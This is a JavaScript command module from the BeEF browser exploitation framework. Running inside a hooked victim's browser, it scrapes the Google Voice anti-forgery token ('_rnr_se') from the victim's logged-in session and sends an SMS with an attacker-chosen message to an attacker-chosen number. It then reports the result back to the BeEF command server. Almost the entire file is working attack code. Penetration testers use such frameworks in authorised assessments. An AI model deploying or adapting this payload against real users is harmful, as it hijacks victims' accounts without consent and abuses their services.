//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
		var to = "<%= @to %>";
		var message = "<%= @message %>";
		var status;
		var regSMS = "('_rnr_se': ')([a-zA-Z0-9\+=]+)";//?(',)"
		
		function sendSMSNOW(message,number,token){
				token = token.replace("+","%2b").replace("=","%3d");
				var sendMessage = new XMLHttpRequest();
				sendMessage.open("POST","https://www.google.com/voice/sms/send/",false);
				sendMessage.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
				params = "id=&phoneNumber="+number+"&conversationId=&text="+message+"&contact=&_rnr_se="+token
				sendMessage.send(params)
				eval("response="+sendMessage.responseText);
				if(response['ok'] == true){
						status = "OK. Your message has been sent.";
				} else {
						status = "ERROR. Something went wrong. Make sure you prefix the number with the country code.";
				}
		}
		
		function sendSMS(message,number) {
				var client = new XMLHttpRequest();
				client.open("GET", "https://www.google.com/voice" ,false);
				client.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
				client.send();
		
				var re = new RegExp(regSMS);
				var m = re.exec(client.responseText);
				if (m != null) {
				//return m[2];
				sendSMSNOW(message,number,m[2]);
			}
		}	


		sendSMS(message,to);

		beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'to='+to+'&message='+message+'&status='+status);
});
